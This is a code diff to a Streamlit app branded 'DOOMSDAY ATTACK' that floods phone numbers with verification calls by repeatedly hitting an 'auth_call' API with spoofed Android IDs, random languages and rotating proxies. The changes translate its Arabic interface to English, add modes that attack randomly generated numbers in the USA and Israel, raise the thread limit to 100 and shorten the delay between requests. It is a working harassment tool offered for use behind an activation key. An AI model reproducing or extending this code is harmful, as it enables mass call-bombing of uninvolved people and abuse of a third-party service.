@@ -10,18 +10,16 @@ import webbrowser
 import os
 from concurrent.futures import ThreadPoolExecutor
 
-# --- إعدادات الصفحة وإخفاء شعارات GitHub و Streamlit ---
+# --- UI Settings and Hiding Streamlit/GitHub Logos ---
 st.set_page_config(page_title="DOOMSDAY ATTACK - GX3GX3", page_icon="💀", layout="wide")
 
 st.markdown("""
     <style>
-    /* إخفاء شعارات Streamlit و GitHub */
     #MainMenu {visibility: hidden;}
     footer {visibility: hidden;}
     header {visibility: hidden;}
     .stDeployButton {display:none;}
     
-    /* تصميم الواجهة المخيفة */
     .main {
         background-color: #000000;
         color: #ff0000;
@@ -55,7 +53,7 @@ st.markdown("""
     </style>
     """, unsafe_allow_html=True)
 
-# --- نظام التحقق من المفتاح ---
+# --- Authentication System ---
 if 'authenticated' not in st.session_state:
     st.session_state.authenticated = False
 
@@ -64,28 +62,26 @@ if not st.session_state.authenticated:
     st.image("https://files.catbox.moe/3cq9i1.jpg", use_container_width=True)
     st.markdown('</div>', unsafe_allow_html=True)
     
-    st.markdown("<h1 style='text-align: center; color: red;'>🔒 نظام التفعيل</h1>", unsafe_allow_html=True)
-    user_key = st.text_input("أدخل المفتاح الخاص بك للوصول إلى القوة:", type="password")
+    st.markdown("<h1 style='text-align: center; color: red;'>🔒 ACTIVATION SYSTEM</h1>", unsafe_allow_html=True)
+    user_key = st.text_input("Enter your access key:", type="password")
     
-    if st.button("تفعيل الأداة 🔥"):
+    if st.button("ACTIVATE 🔥"):
         if user_key == "aligx3gx3":
             st.session_state.authenticated = True
             st.rerun()
         else:
-            st.error("❌ المفتاح خطأ! تواصل مع المطور لتفعيل @PDD6P")
+            st.error("❌ Invalid Key! Contact dev for activation @PDD6P")
     st.stop()
 
-# --- إذا تم التفعيل، تظهر الأداة كاملة ---
-
-# صورة البداية في إطار مخيف
+# --- Main App ---
 st.markdown('<div class="img-container">', unsafe_allow_html=True)
 st.image("https://files.catbox.moe/3cq9i1.jpg", use_container_width=True)
 st.markdown('</div>', unsafe_allow_html=True)
 
-st.markdown("<h1 style='text-align: center; color: #ff0000; font-size: 50px;'>هجـوم يوم القيامة</h1>", unsafe_allow_html=True)
-st.markdown("<h3 style='text-align: center; color: white;'>قناتي: gx3gx3 | المطور: @PDD6P</h3>", unsafe_allow_html=True)
+st.markdown("<h1 style='text-align: center; color: #ff0000; font-size: 50px;'>DOOMSDAY ATTACK</h1>", unsafe_allow_html=True)
+st.markdown("<h3 style='text-align: center; color: white;'>Channel: gx3gx3 | Dev: @PDD6P</h3>", unsafe_allow_html=True)
 
-# --- تثبيت المكتبات تلقائياً (بدون حذف حرف واحد) ---
+# --- Auto-install Libs ---
 def install_libs():
     libs = ['requests', 'termcolor', 'pyfiglet']
     for lib in libs:
@@ -100,7 +96,6 @@ import requests
 from termcolor import colored
 import pyfiglet
 
-# رابط القناة الجديد
 CH_LINK = 'https://t.me/gx3gx3'
 
 def generate_unique_ids():
@@ -168,22 +163,32 @@ def send_auth_call_request(url, headers, payload, proxy=None):
         return response.ok and "ok" in response.text
     except: return False
 
-# إعداد العدادات
 if 'stats' not in st.session_state:
     st.session_state.stats = {"ok": 0, "error": 0}
 if 'running' not in st.session_state:
     st.session_state.running = False
+if 'current_target' not in st.session_state:
+    st.session_state.current_target = ""
 
-# واجهة الإدخال
-col1, col2 = st.columns(2)
-with col1:
-    country_code = st.text_input("🌍 كود الدولة (بدون +):", value="964")
-with col2:
-    number = st.text_input("📱 رقم الهاتف (بدون مقدمة):")
+# --- Input Interface ---
+attack_mode = st.radio("Select Target Mode:", ["Manual Entry", "Random USA Attack 🇺🇸", "Random Israel Attack 🇮🇱"])
 
-threads_count = st.slider("☣️ قوة الهجوم (Threads):", 1, 50, 15)
+if attack_mode == "Manual Entry":
+    col1, col2 = st.columns(2)
+    with col1:
+        c_code = st.text_input("🌍 Country Code (No +):", value="964")
+    with col2:
+        num_input = st.text_input("📱 Phone Number (No prefix):")
+elif attack_mode == "Random USA Attack 🇺🇸":
+    c_code = "1"
+    num_input = "RANDOM"
+else:
+    c_code = "972"
+    num_input = "RANDOM"
 
-def worker_task(country_code, number):
+threads_count = st.slider("☣️ Attack Power (Threads):", 1, 100, 15)
+
+def worker_task(country_code, target_number):
     foreign_langs = ["en", "fr", "de", "tr", "es", "pt", "it", "ko", "ru", "ja", "zh", "ar", "hi"]
     proxies_list = load_proxies()
     
@@ -194,6 +199,14 @@ def worker_task(country_code, number):
     placeholder = st.empty()
 
     while st.session_state.running:
+        # Determine actual number to attack
+        if target_number == "RANDOM":
+            final_num = "".join(random.choices(string.digits, k=9))
+        else:
+            final_num = target_number
+        
+        st.session_state.current_target = f"+{country_code}{final_num}"
+
         foxx, fox, foxer = generate_unique_ids()
         random_android_version = str(random.randint(7, 14))
         random_lang = random.choice(foreign_langs)
@@ -210,7 +223,7 @@ def worker_task(country_code, number):
                 payload_auth_call = json.dumps({
                     "android_id": fox, "app_version": "17.5.17", "attempt": "0",
                     "event": "auth_call", "lang": random_lang, "os": "android",
-                    "os_version": random_android_version, "phone": f"+{country_code}{number}",
+                    "os_version": random_android_version, "phone": st.session_state.current_target,
                     "ts": foxx, "uuid": str(foxer)
                 })
                 if send_auth_call_request(auth_call_url, headers, payload_auth_call, proxy):
@@ -220,18 +233,19 @@ def worker_task(country_code, number):
         except: st.session_state.stats["error"] += 1
 
         with placeholder.container():
-            st.metric("🔥 هجمات ناجحة", st.session_state.stats["ok"])
-            st.metric("💀 هجمات فاشلة", st.session_state.stats["error"])
-        time.sleep(0.05)
+            st.error(f"🎯 ATTACKING: {st.session_state.current_target}")
+            st.metric("🔥 SUCCESSFUL HITS", st.session_state.stats["ok"])
+            st.metric("💀 FAILED ATTEMPTS", st.session_state.stats["error"])
+        time.sleep(0.01)
 
-if st.button("⚠️ بـدء الهجـوم"):
-    if number:
+if st.button("⚠️ LAUNCH ATTACK"):
+    if num_input:
         st.session_state.running = True
-        worker_task(country_code, number)
+        worker_task(c_code, num_input)
     else:
-        st.error("أدخل الرقم أولاً يا وحش!")
+        st.error("Enter a number or select random mode!")
 
-if st.button("❌ إيقاف"):
+if st.button("❌ STOP"):
     st.session_state.running = False
-    st.warning("تم إيقاف الهجوم.")
+    st.warning("Attack Terminated.")
 
